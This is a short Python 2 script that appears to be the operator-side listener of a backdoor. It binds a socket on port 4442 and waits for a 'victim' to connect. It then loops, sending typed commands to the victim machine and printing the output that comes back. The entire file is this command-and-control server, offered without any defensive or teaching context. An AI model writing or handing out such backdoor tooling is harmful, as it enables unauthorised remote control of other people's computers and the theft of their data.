import socket


my_ip = 'yourIp'
port = 4442
server = socket.socket()
server.bind((my_ip, port))
print('[+] Server Started')
print('[+] Listening For Victim')
server.listen(1)
victim, victim_addr = server.accept()
print(" Victim opened the backdoor")
print(victim_addr)

while True:
    command = raw_input("Enter Command:")
    # command = command.encode()
    victim.send(command)
    print('[+] Command sent')
    output = victim.recv(1024)
    # output = output.decode()
    print(output)
    